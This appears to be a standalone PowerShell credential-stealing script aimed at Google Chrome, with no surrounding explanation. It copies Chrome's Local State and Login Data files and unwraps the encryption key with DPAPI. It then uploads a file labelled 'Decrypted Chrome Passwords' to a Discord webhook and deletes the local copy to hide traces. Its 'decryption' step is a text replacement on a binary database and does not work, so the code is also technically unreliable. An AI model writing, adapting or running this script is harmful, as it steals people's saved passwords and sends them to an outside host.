$sourceFile = $env:LOCALAPPDATA+'\Google\Chrome\User Data\Local State'
$outputFile = "c:\key.txt"
Copy-Item $sourceFile $outputFile


$localState = Get-Content -Path $outputFile | ConvertFrom-Json
$encryptionKey = $localState.os_crypt.encrypted_key


$encryptionKeyBytes = [System.Convert]::FromBase64String($encryptionKey)
$encryptionKeyBytes = $encryptionKeyBytes[5..($encryptionKeyBytes.Length - 1)]
$decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptionKeyBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)


$sourceFile = $env:LOCALAPPDATA+'\Google\Chrome\User Data\Default\Login Data'
$outputFile = "c:\decrypted_passwords.txt"
Copy-Item $sourceFile $outputFile


$chromePasswords = Get-Content -Path $outputFile
$chromePasswords = $chromePasswords -replace 'encrypted_key', 'decrypted_key'
$chromePasswords = $chromePasswords -replace $encryptionKey, $decryptedKey
$chromePasswords | Out-File -FilePath $outputFile -Encoding utf8


function Upload-Discord {
    [CmdletBinding()]
    param(
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text
    )
    $Body = @{'username' = $env:username; 'content' = $text};
    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }
    if (-not ([string]::IsNullOrEmpty($file))){
        curl.exe -F "file1=@$file" $hookurl
    }
}
Upload-Discord -file $outputFile -text "Decrypted Chrome Passwords"


Remove-Item $outputFile
